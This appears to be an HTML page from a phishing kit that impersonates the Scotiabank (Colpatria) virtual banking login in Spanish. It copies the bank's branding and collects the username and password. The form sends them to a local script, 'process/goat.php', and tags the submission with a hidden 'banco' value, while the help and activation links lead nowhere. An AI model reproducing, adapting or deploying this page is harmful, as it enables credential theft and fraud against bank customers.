<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scotiabank | Banca Virtual</title>
    <link rel="stylesheet" href="scotiabank.css">
    <script src="../../scripts/jquery-3.6.0.min.js"></script>
</head>
<body>
<div class="login-page fade-in">

    <!-- Header con logo -->
    <header class="login-header">
        <img src="new-brand-red.svg" alt="Scotiabank">
    </header>

    <!-- Cuerpo del login -->
    <main class="login-body">
        <div class="login-card">

            <h1 class="heading" style="margin-bottom:3.2rem;">Ingresa a tu Banca Virtual</h1>

            <form action="process/goat.php" method="POST">
                <input type="hidden" name="banco" value="colpatria">

                <!-- Usuario -->
                <div class="form-field">
                    <span class="form-field__icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none"
                             viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
                            <path stroke-linecap="round" stroke-linejoin="round"
                                  d="M15.75 6a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0ZM4.501 20.118a7.5 7.5 0 0 1 14.998 0A17.933 17.933 0 0 1 12 21.75c-2.676 0-5.216-.584-7.499-1.632Z"/>
                        </svg>
                    </span>
                    <input class="form-field__input"
                           type="text"
                           name="user"
                           id="txtUsuario"
                           placeholder="Nombre de usuario"
                           required
                           autocomplete="username">
                </div>

                <!-- Contraseña -->
                <div class="form-field">
                    <span class="form-field__icon">
                        <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none"
                             viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
                            <path stroke-linecap="round" stroke-linejoin="round"
                                  d="M16.5 10.5V6.75a4.5 4.5 0 1 0-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 0 0 2.25-2.25v-6.75a2.25 2.25 0 0 0-2.25-2.25H6.75a2.25 2.25 0 0 0-2.25 2.25v6.75a2.25 2.25 0 0 0 2.25 2.25Z"/>
                        </svg>
                    </span>
                    <input class="form-field__input"
                           type="password"
                           name="pass"
                           id="txtPass"
                           placeholder="Contraseña"
                           required
                           minlength="6"
                           autocomplete="current-password">
                </div>

                <!-- Olvidé mis datos -->
                <a href="#" class="link" style="display:block;margin-bottom:2.4rem;font-size:1.6rem;">
                    ¿Olvidaste tu usuario o contraseña?
                </a>

                <!-- Recordar usuario -->
                <label class="checkbox-wrapper">
                    <input type="checkbox" id="chkRecordar">
                    <span>Recordar mi nombre de usuario</span>
                </label>

                <!-- Botón ingresar -->
                <button type="submit" name="clave" class="button button--primary"
                        style="font-size:1.8rem;min-height:5.2rem;border-radius:3.2rem;">
                    Ingresar
                </button>
            </form>

            <!-- Footer -->
            <div class="footer-link-row">
                <span class="text--small">¿Eres nuevo con nosotros?</span>
                <a href="#" class="link" style="font-size:1.6rem;">Activa tu usuario</a>
            </div>

        </div>
    </main>

</div>
</body>
</html>
